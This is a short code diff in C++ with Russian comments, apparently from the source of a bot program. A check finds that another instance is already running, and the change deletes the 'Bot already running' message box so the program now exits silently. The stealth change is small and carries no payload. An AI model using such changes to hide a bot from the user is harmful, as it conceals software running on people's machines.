@@ -251,7 +251,6 @@ int APIENTRY MyMain()
 	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
 	if (BOT::IsRunning())
 	{
-		pMessageBoxA(NULL, "Бот уже запущен", NULL, 0);
 		pExitProcess(0);
 		return 0; // Паранойя :)
 	}
